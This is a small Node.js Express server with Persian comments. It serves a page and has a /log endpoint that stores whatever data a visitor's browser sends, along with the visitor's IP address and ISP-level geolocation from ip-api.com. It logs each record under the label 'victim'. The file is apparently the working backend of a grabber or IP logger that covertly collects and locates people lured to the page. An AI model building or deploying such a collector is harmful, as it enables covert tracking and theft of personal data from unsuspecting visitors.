const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(express.json({ limit: '10mb' }));

// صفحه اصلی
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// دریافت اطلاعات
app.post('/log', async (req, res) => {
  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'unknown';
  data.ip = ip;
  data.timestamp = new Date().toISOString();

  if (!ip.includes('127.0.0.1') && !ip.includes('::1')) {
    try {
      const geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
      if (geo.status === 'success') {
        data.location = {
          city: geo.city,
          region: geo.regionName,
          country: geo.country,
          isp: geo.isp
        };
      }
    } catch {}
  }

  // لاگ در کنسول (برای Vercel Logs)
  console.log('قربانی:', JSON.stringify(data, null, 2));

  res.sendStatus(200);
});

// برای Vercel
module.exports = app;